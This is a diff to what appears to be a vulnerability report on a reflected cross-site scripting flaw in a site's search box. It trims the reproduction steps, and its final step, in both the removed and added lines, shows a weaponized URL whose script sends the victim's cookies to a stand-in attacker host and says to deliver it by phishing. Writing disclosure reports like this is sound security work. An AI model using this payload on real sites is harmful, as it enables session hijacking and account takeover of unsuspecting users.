@@ -19,17 +19,13 @@ An unauthenticated Reflected Cross-Site Scripting (`XSS`) vulnerability exists i
 ## Steps to Reproduce
 1. Interact with the search box and observe whether the input `cybrnoob'"<>` is reflected in the source.
     <img width="1512" height="982" alt="SCR-20261119-pvvk" src="https://github.com/user-attachments/assets/f3479988-508a-4840-8e00-7f4ffb8389a2" />
-2. Check for any other parameters and methods [`GET,POST`] for a wider attack surface.
-    <img width="697" height="201" alt="Screenshot 2026-11-19 at 10 09 41 PM" src="https://github.com/user-attachments/assets/5c1ce955-2436-4a14-a231-1c9adbc84907" />
-3. For the parameters found, check via automation to see if a reflected url path exists.
-    <img width="710" height="249" alt="Screenshot 2026-11-19 at 10 09 53 PM" src="https://github.com/user-attachments/assets/9be5922c-f494-4559-bddc-47fdd0915282" />
-4. Inject javascript in the search box to verify if it is executed.
+2. Inject javascript in the search box to verify if it is executed.
   - Note: `alert(), confirm(), prompt(), console.log(), console.error(), fetch()` all generate valid responses.
      - Here it can be seen that the injected payload executes seamlessly.
     <img width="1512" height="982" alt="SCR-20261119-pwgx" src="https://github.com/user-attachments/assets/121ca5e3-95c8-41f3-a43e-fe363a0718ab" />
     <img width="1512" height="982" alt="SCR-20261119-pwdm" src="https://github.com/user-attachments/assets/77919c09-44e9-4c80-aca3-61543765565c" />
     <img width="1512" height="982" alt="SCR-20261119-tfnc" src="https://github.com/user-attachments/assets/10ccd7f2-eebb-432d-9e90-ace4f2d25033" />
-5. Craft a weaponized URL (e.g., `https://pubmed.pwnedbox.site/index.php?term=<script>fetch('https://attacker.tld/steal?c='+document.cookie)</script>`) and deliver it to a victim via phishing, malicious link, or social engineering; upon opening the link, the payload executes in the victim's browser origin without any user interaction beyond clicking the link.
+3. Craft a weaponized URL (e.g., `https://pubmed.pwnedbox.site/index.php?term=<script>fetch('https://attacker.tld/steal?c='+document.cookie)</script>`) and deliver it to a victim via phishing, malicious link, or social engineering; upon opening the link, the payload executes in the victim's browser origin without any user interaction beyond clicking the link.
 
 ## Impact / Risk
 1. An attacker can steal session cookies and impersonate the victim.
